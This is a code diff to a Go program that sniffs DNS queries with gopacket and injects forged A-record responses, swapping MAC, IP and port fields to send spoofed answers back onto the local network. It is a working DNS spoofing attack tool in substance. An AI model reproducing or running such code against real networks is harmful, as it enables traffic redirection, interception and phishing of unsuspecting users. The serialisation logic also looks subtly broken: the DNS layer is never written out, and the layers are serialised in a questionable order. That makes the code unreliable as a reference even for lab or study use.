@@ -64,26 +64,28 @@ func spoof(ifacename string) {
 	}
 
 	// open a handle to the network card(s)
-	handle, err := pcap.OpenLive(ifacename, 1600, true, pcap.BlockForever)
+	ifaceHandle, err := pcap.OpenLive(ifacename, 1600, true, pcap.BlockForever)
 	if err != nil {
 		panic(err)
 	}
 
 	// set the filter
-	err = handle.SetBPFFilter("dst port 53")
+	err = ifaceHandle.SetBPFFilter("dst port 53")
 	if err != nil {
 		// not fatal
 		fmt.Printf("Unable to set filter: %v\n", err.Error())
 	}
 
 	// get the channel source from the card
-	pktSource := gopacket.NewPacketSource(handle, handle.LinkType())
+	pktSource := gopacket.NewPacketSource(ifaceHandle, ifaceHandle.LinkType())
 
 	// pre-allocate all the space needed for the layers
 	var ethLayer	layers.Ethernet
 	var ipv4Layer	layers.IPv4
 	var udpLayer	layers.UDP
 	var dnsLayer	layers.DNS
+
+	var q		layers.DNSQuestion
 	var a		layers.DNSResourceRecord
 
 	// create the decoder for fast-packet decoding
@@ -99,7 +101,27 @@ func spoof(ifacename string) {
 	a.TTL = 300
 	a.IP = ip
 
+	// create a buffer for writing output packet
+	outbuf := gopacket.NewSerializeBuffer()
+	// TODO (Optionally) replace with NewSerializeBufferExpectedSize to speed up a bit more
+
+	// set the arguments for serialization
+	serialOpts := gopacket.SerializeOptions {
+		FixLengths: true,
+		ComputeChecksums: true,
+	}
+
+	// pre-allocate loop counter
+	var i uint16
+
+	// swap storage for ip and udp fields
+	var ipv4Addr net.IP
+	var udpPort layers.UDPPort
+	var ethMac net.HardwareAddr
+
 	// Main loop for dns packets intercepted
+	// No new allocations after this point to keep garbage collector
+	// cyles at a minimum
 	for packet := range pktSource.Packets() {
 
 		// decode this packet using the fast decoder
@@ -121,7 +143,7 @@ func spoof(ifacename string) {
 		}
 
 		// print the question section
-		for i := uint16(0); i < dnsLayer.QDCount; i++ {
+		for i = 0; i < dnsLayer.QDCount; i++ {
 			fmt.Println(string(dnsLayer.Questions[i].Name))
 		}
 
@@ -129,10 +151,10 @@ func spoof(ifacename string) {
 		dnsLayer.QR = true
 
 		// for each question
-		for i := uint16(0); i < dnsLayer.QDCount; i++ {
+		for i = 0; i < dnsLayer.QDCount; i++ {
 
 			// get the question
-			q := dnsLayer.Questions[i]
+			q = dnsLayer.Questions[i]
 
 			// verify this is an A-IN record question
 			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
@@ -146,5 +168,58 @@ func spoof(ifacename string) {
 			dnsLayer.Answers = append(dnsLayer.Answers, a)
 
 		}
+
+		// swap ethernet macs
+		ethMac = ethLayer.SrcMAC
+		ethLayer.SrcMAC = ethLayer.DstMAC
+		ethLayer.DstMAC = ethMac
+
+		// swap the ip
+		ipv4Addr = ipv4Layer.SrcIP
+		ipv4Layer.SrcIP = ipv4Layer.DstIP
+		ipv4Layer.DstIP = ipv4Addr
+
+		// swap the udp ports
+		udpPort = udpLayer.SrcPort
+		udpLayer.SrcPort = udpLayer.DstPort
+		udpLayer.DstPort = udpPort
+
+		// clear the output buffer
+		outbuf.Clear()
+
+		// set the UDP to be checksummed by the IP layer
+		err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
+		if err != nil {
+			panic(err)
+		}
+
+		// add the data to the udp
+		udpLayer.Payload = dnsLayer.Payload()
+
+		// serialize eth layer
+		err = ethLayer.SerializeTo(outbuf, serialOpts)
+		if err != nil {
+			panic(err)
+		}
+
+		// serialize ip layer
+		err = ipv4Layer.SerializeTo(outbuf, serialOpts)
+		if err != nil {
+			panic(err)
+		}
+
+		// upd layer
+		err = udpLayer.SerializeTo(outbuf, serialOpts)
+		if err != nil {
+			panic(err)
+		}
+
+		// write packet
+		err = ifaceHandle.WritePacketData(outbuf.Bytes())
+		if err != nil {
+			panic(err)
+		}
+		fmt.Println("Sent response")
+
 	}
 }
